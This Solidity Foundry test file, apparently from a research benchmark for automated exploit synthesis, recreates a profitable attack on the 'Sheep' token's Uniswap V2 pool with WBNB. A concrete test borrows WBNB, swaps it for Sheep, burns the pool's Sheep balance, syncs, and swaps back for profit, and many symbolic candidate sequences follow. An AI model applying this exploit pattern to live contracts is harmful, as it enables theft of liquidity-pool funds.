// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./Sheep.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract SheepTest is Test, BlockLoader {
    Sheep sheep;
    WBNB wbnb;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address sheepAddr;
    address wbnbAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1676025497;
    uint112 reserve0pair = 30014300506936992470;
    uint112 reserve1pair = 38470984903412245858;
    uint32 blockTimestampLastpair = 1675722409;
    uint256 kLastpair = 1122868307280328442262450950989748254104;
    uint256 price0CumulativeLastpair =
        1616823377360631691215659092778701611131461;
    uint256 price1CumulativeLastpair =
        143397831916806160937205875676966651717530;
    uint256 totalSupplysheep = 72363505585019823035;
    uint256 balanceOfsheeppair = 30014300506936992470;
    uint256 balanceOfsheepattacker = 0;
    uint256 balanceOfsheep = 32970881093158609502;
    uint256 totalSupplywbnb = 3797552140793988220423630;
    uint256 balanceOfwbnbpair = 38470984903412245858;
    uint256 balanceOfwbnbattacker = 0;
    uint256 balanceOfwbnb = 48486432013583908291;

    function setUp() public {
        owner = address(this);
        sheep = new Sheep(
            "Sheep",
            "Sheep",
            9,
            72363505585,
            0,
            0,
            0,
            address(0x0),
            owner
        );
        sheepAddr = address(sheep);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        pair = new UniswapV2Pair(
            address(sheep),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        sheep.transfer(address(pair), balanceOfsheeppair);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Sheep Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(sheep),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(sheep),
            address(sheep),
            sheep.decimals()
        );
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(sheep),
            address(wbnb),
            sheep.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(sheep),
            address(pair),
            sheep.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attackContract),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(sheep),
            address(attackContract),
            sheep.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_wbnb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_wbnb(uint256 amount) internal {
        wbnb.transfer(owner, amount);
    }

    function borrow_owner_sheep(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        sheep.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_sheep(uint256 amount) internal {
        sheep.transfer(owner, amount);
    }

    function borrow_pair_wbnb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_wbnb(uint256 amount) internal {
        wbnb.transfer(address(pair), amount);
    }

    function borrow_pair_sheep(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        sheep.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_sheep(uint256 amount) internal {
        sheep.transfer(address(pair), amount);
    }

    function swap_pair_sheep_wbnb(uint256 amount) internal {
        sheep.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(sheep);
        path[1] = address(wbnb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_wbnb_sheep(uint256 amount) internal {
        wbnb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(sheep);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_sheep(uint256 amount) internal {
        sheep.burn(address(pair), amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_wbnb(38000e15);
        printBalance("After step0 ");
        swap_pair_wbnb_sheep(wbnb.balanceOf(attacker));
        printBalance("After step1 ");
        burn_pair_sheep(sheep.balanceOf(address(pair)) - 1);
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_sheep_wbnb(sheep.balanceOf(attacker));
        printBalance("After step4 ");
        payback_owner_wbnb(38114e15);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_sheep(amt1);
        burn_pair_sheep(amt2);
        sync_pair();
        swap_pair_sheep_wbnb(amt3);
        payback_owner_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_sheep(amt0);
        burn_pair_sheep(amt1);
        payback_owner_sheep(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_sheep(amt0);
        burn_pair_sheep(amt1);
        payback_pair_sheep(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_sheep(amt0);
        burn_pair_sheep(amt1);
        swap_pair_sheep_wbnb(amt2);
        payback_owner_sheep(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_sheep(amt0);
        burn_pair_sheep(amt1);
        sync_pair();
        payback_owner_sheep(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_sheep(amt0);
        burn_pair_sheep(amt1);
        swap_pair_sheep_wbnb(amt2);
        payback_pair_sheep(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_sheep(amt0);
        burn_pair_sheep(amt1);
        sync_pair();
        payback_pair_sheep(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_sheep(amt1);
        burn_pair_sheep(amt2);
        swap_pair_sheep_wbnb(amt3);
        payback_owner_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_sheep(amt0);
        burn_pair_sheep(amt1);
        swap_pair_sheep_wbnb(amt2);
        swap_pair_sheep_wbnb(amt3);
        payback_owner_sheep(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_sheep(amt0);
        burn_pair_sheep(amt1);
        sync_pair();
        swap_pair_sheep_wbnb(amt2);
        payback_owner_sheep(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_wbnb(amt0);
        swap_pair_wbnb_sheep(amt1);
        burn_pair_sheep(amt2);
        swap_pair_sheep_wbnb(amt3);
        payback_pair_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_sheep(amt0);
        burn_pair_sheep(amt1);
        swap_pair_sheep_wbnb(amt2);
        swap_pair_sheep_wbnb(amt3);
        payback_pair_sheep(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_sheep(amt0);
        burn_pair_sheep(amt1);
        sync_pair();
        swap_pair_sheep_wbnb(amt2);
        payback_pair_sheep(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_sheep(amt1);
        burn_pair_sheep(amt2);
        swap_pair_sheep_wbnb(amt3);
        swap_pair_sheep_wbnb(amt4);
        payback_owner_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_sheep(amt1);
        burn_pair_sheep(amt2);
        sync_pair();
        swap_pair_sheep_wbnb(amt3);
        payback_owner_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}